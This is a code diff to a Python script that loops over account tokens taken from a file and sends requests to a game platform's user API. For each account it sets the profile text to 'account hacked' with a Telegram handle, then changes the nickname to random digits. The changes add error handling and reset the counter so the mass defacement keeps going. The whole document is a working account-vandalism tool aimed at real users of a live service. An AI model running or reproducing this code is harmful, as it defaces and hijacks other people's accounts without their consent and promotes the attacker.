@@ -5,7 +5,7 @@ import requests
 with open("bot.txt", "r") as file:
     bot = file.readlines()
 
-send = 6299
+send = 0
 
 while True:
     send += 1
@@ -29,8 +29,17 @@ while True:
         "details": "account hacked\ntelegram @nullowns\nt.mе/nullowns"
     }
 
-    response = requests.put("https://gw.sandboxol.com/user/api/v1/user/info", headers=headers, json=data).json()
+    try:
+        response = requests.put("https://gw.sandboxol.com/user/api/v1/user/info", headers=headers, json=data).json()
+    except:
+        send -= 1
+        continue
 
     if response["message"] == "SUCCESS":
-        response = requests.put(f"https://gw.sandboxol.com/user/api/v3/user/nickName?newName={''.join(random.choices('0123456789', k=20))}&oldName={response['data']['nickName']}", headers=headers).json()
+        try:
+            response = requests.put(f"https://gw.sandboxol.com/user/api/v3/user/nickName?newName={''.join(random.choices('0123456789', k=20))}&oldName={response['data']['nickName']}", headers=headers).json()
+        except:
+            send -= 1
+            continue
+
         print(response["message"] + f" | {id} | {send + 1}")
